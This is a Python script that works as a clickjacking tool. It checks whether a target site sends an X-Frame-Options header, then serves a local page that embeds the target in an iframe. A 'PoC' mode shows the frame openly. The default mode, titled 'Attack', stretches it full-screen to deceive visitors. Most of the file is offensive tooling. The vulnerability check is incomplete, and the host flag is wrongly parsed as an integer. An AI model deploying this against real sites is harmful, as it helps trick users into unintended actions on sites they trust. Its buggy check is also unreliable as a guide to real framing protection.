import sys,requests
from http.server import test,HTTPServer,SimpleHTTPRequestHandler,BaseHTTPRequestHandler 


# variables ------------------------------------------------------------------

TARGET = ""
HOST = "localhost"
PORT = 8000


# clases

class PoC_Server(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(f"<html><head><meta charset='utf-8'><title>PoC - Clickjacking</title></head><body><p>Is this website vulnerable to Clickjacking?</p><iframe id='clickjackingFrame' src='{TARGET}' width='600px' height='500px'></body></html>","utf-8"))

class Hack_Server(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(f"<html><head><meta charset='utf-8'><title>Attack - Clickjacking</title></head><body><iframe id='clickjackingFrame' src='{TARGET}' width='101%' height='102.1%' style='margin:-9px'></body></html>","utf-8"))


# functions ------------------------------------------------------------------

def usage():
    print(f"Usage:\n\tpython3 {sys.argv[0]} -t <target> [--PoC | -lh <local_host> | -lp <local_port>]\n\nFlags:\n\t-t,    Set target to create a website that hijacks clicks on it.\n\t--PoC, Run proof of concept.\n\t-lh,   Set the host where the web server is going to be running (default: localhost).\n\t-lp,   Set the port where the web server is going to be running (default: 8000).\n")      
    exit()

def analyze(url):
    r = requests.get(url)
    if "X-Frame-Options" in r.headers:
        print("[!] The website is not vulnerable\n")
        exit()
    else:
        print("[✓] The website appears to be vulnerable")

def clickjackingPoC():
    analyze(TARGET)
    PoC_Server.target = TARGET
    print("[+] PoC of Clickjacking using " + TARGET)
    webServer = HTTPServer((HOST, int(PORT)), PoC_Server) #SimpleHTTPRequestHandleri)
    print("[+] Web-Server mounted in http://" + HOST + ":" + str(PORT))
    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        pass
    webServer.server_close()
  
def clickjackingHack():
    analyze(TARGET)
    print("[+] Clickjacking Attack using " + TARGET)
    webServer = HTTPServer((HOST, int(PORT)), Hack_Server) #SimpleHTTPRequestHandleri)
    print("[+] Web-Server mounted in http://" + HOST + ":" + str(PORT))
    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        pass
    webServer.server_close()


# read parameters -----------------------------------------------------------

if "--help" in sys.argv or "-h" in sys.argv or len(sys.argv) < 3 or len(sys.argv) > 8 or "-t" not in sys.argv:
	usage()

if "-t" in sys.argv:
    TARGET = sys.argv[sys.argv.index("-t")+1]

if "-lh" in sys.argv:
    HOST = int(sys.argv[sys.argv.index("-lh")+1])

if "-lp" in sys.argv:
    PORT = sys.argv[sys.argv.index("-lp")+1]

if "--PoC" in sys.argv:
    clickjackingPoC()
elif len(sys.argv) == 3:
    clickjackingHack()
else:
    usage()

